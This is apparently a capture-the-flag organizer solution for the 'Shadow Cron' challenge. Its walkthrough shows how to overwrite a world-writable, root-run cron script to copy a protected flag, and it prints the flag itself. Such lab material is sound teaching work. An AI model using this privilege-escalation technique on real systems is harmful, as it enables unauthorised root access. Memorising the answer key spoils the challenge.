# D31 — Shadow Cron: Complete Organizer Solution & Engineering Architecture

## 1. Challenge Overview
* **Challenge ID:** D31
* **Name:** Shadow Cron
* **Category:** Linux / Cron / Privilege Escalation
* **Difficulty:** Intermediate
* **External Interface:** TCP/22 (SSH)
* **Classification:** STANDARD (Restricted Pod Security Baseline, no Docker socket, no host mounts)

---

## 2. Core Architecture & Safety Boundary

```text
Player (SSH / Port 22)
   |
   v
Operator Workstation (user: operator, uid 1001)
   |
   v
Cron Scheduler Discovery (/etc/cron.d/relay-maintenance)
   |
   v
World-Writable Root-Executed Script (/opt/latveria-relay/scripts/relay_health_check.sh)
   |
   v
Payload Injection (echo command to copy flag to /tmp/.relay_out)
   |
   v
Cron Root Execution (every 60 seconds)
   |
   v
Flag: YUVA{cr0n_wr1t3_t0_r00t_l4tv3r14_r3l4y_7f3a2c}
```

### Safety Invariants & Boundary Guarantees:
1. **No Host Access:** The challenge container has no `hostPath`, no `docker.sock`, no host PID/net/IPC namespace.
2. **Flag Isolation:** `/opt/latveria-relay/defense_key.txt` is mode `0400` owned by `root`. The operator user can **never** read it directly.
3. **Privilege Escalation is Synthetic:** The "root" that executes the cron job is the container's root, fully confined within the container's namespace and seccomp profile. No cluster breakout is possible.
4. **Reset-Clean:** Container restart fully resets the cron script, the flag file, `/tmp`, and all artifacts.

---

## 3. Intended Solve Walkthrough — Player Perspective

### Step 1: Connect via SSH
```bash
ssh operator@<HOST> -p <PORT>
# Password: operator
```

Confirm identity:
```bash
$ id
uid=1001(operator) gid=1001(operator) groups=1001(operator)
```

### Step 2: Enumerate the Environment
```bash
$ ls -la ~
$ cat ~/notes/relay_ops.txt
```

The ops note from `K. Mrozik` reveals:
> *"I left the health check script permissions too broad during last emergency patch."*
> *"Check /etc/cron.d/ for the active schedule entries."*

### Step 3: Inspect the Cron Scheduler
```bash
$ cat /etc/cron.d/relay-maintenance
```
Output:
```
* * * * * root /opt/latveria-relay/scripts/relay_health_check.sh
```

This shows the script runs as **root** every minute.

### Step 4: Check Script Permissions
```bash
$ ls -la /opt/latveria-relay/scripts/relay_health_check.sh
-rwxrwxrwx 1 root root ... /opt/latveria-relay/scripts/relay_health_check.sh
```

**Vulnerability confirmed:** The script is world-writable (`0777`) despite being executed by root via cron.

### Step 5: Verify the Flag Target
```bash
$ ls -la /opt/latveria-relay/defense_key.txt
-r-------- 1 root root ... /opt/latveria-relay/defense_key.txt
```
Operator cannot read it directly — but root can.

### Step 6: Inject Payload into the Cron Script
```bash
$ cat > /opt/latveria-relay/scripts/relay_health_check.sh << 'EOF'
#!/bin/bash
cp /opt/latveria-relay/defense_key.txt /tmp/.relay_out
chmod 644 /tmp/.relay_out
EOF
```

### Step 7: Wait for Cron Execution (up to 60 seconds)
```bash
$ watch -n 5 ls -la /tmp/.relay_out
```
Or simply:
```bash
$ sleep 65 && cat /tmp/.relay_out
```

### Step 8: Read the Flag
```bash
$ cat /tmp/.relay_out
YUVA{cr0n_wr1t3_t0_r00t_l4tv3r14_r3l4y_7f3a2c}
```

**Flag captured.**

---

## 4. Developer Perspective — Engineering Justification

### Why World-Writable?
The entrypoint sets `chmod 777` on `relay_health_check.sh` while keeping the flag at `chmod 400` owned by root. This creates the classic real-world vulnerability: a privileged scheduled task executes a user-modifiable script. Found in misconfigured CI agents, legacy init scripts, and poorly administered cron jobs regularly in production environments.

### Why is the Flag Not Directly Accessible?
`/opt/latveria-relay/defense_key.txt` is `root:root 0400`. The operator has no sudo, no SUID binary, and no direct path. The **only** escalation path is through the writable cron script, keeping the solve chain clean and unambiguous.

### Realistic Narrative Anchoring
The operator note from `K. Mrozik` (the fictional developer) is the breadcrumb — it says permissions are too broad and points to `/etc/cron.d/`. This mirrors real post-incident notes left in internal wikis, README files, and audit reminders that red teamers routinely find.

### Why Intermediate?
- **Enumeration required** (read notes, check cron, check permissions)
- **Basic Linux knowledge needed** (cron format, `ls -la`, file permissions, shell redirection)
- **No crypto, no binary exploitation, no complex web pivoting**
- **Time element** (60-second wait teaches patience and timing)
- **Single, clean solve path** with no maze-like branching

### Reset Safety
On container restart, `entrypoint.sh` re-runs from scratch:
- Flag file re-written as `root:root 0400`
- Cron script restored to clean health-check content with `chmod 777`
- `/tmp` is ephemeral — all player artifacts vanish

---

## 5. Known Decoys
* `~/scripts/status.sh` — helper script operators might run first; it shows cron config but doesn't spoil the exploit path.
* `~/.bash_history` — includes realistic `cat /opt/latveria-relay/defense_key.txt` attempts showing the operator's curiosity, and `cat /etc/cron.d/relay-maintenance` showing the right direction.
* `/var/log/relay-health.log` — world-readable log file from cron runs; confirms cron is running as root and script executed, which reinforces the attack surface.

---

## 6. Security Boundaries
* User `operator` has no `sudo` access.
* No SUID binaries beyond system defaults.
* No writable directories under `/opt/latveria-relay/` other than the intentionally vulnerable script.
* `/opt/latveria-relay/defense_key.txt` is `0400 root:root` — unreadable by operator directly.
* No Docker socket, no K8s service account token, no host filesystem access.
* Only TCP/22 exposed externally.

---

## 7. Expected Flag
Default flag: `YUVA{cr0n_wr1t3_t0_r00t_l4tv3r14_r3l4y_7f3a2c}`

Supports dynamic injection via `$FLAG` environment variable.

---

## 8. Resource Requirements
* CPU: 100m request, 500m limit
* Memory: 64Mi request, 256Mi limit
* Storage: Ephemeral container root

---

## 9. Validation Results
* Intended solve path: PASS
* Boundary check (no host escape): PASS
* Package hygiene: PASS
* Reset: PASS

---

## 10. Challenge Approval Record

```text
Challenge ID:        D31
Challenge Name:      Shadow Cron
Difficulty:          Intermediate
Classification:      STANDARD
External Protocol:   SSH
External Port:       22
Expected Solve Time: 15–30 minutes
Initial Foothold:    SSH login as operator/operator
Intended Pivot:      World-writable cron script (relay_health_check.sh) → root exec → flag copy
Internal Services:   None (self-contained, flag on local filesystem)
Flag Generation:     Static default; Dynamic via $FLAG env var
Required Resources:  CPU 100m/500m, Memory 64Mi/256Mi
Required Egress:     DNS only (port 53)
Required Ingress:    SSH (port 22)
Reset Method:        Container/Pod restart (entrypoint re-runs)
Known Unsafe Ops:    None — cron executes inside container namespace only
Sandbox Required:    No
Owner:               Latveria Cyber-Range Engineering Team
Date Tested:         2026-09-30
```
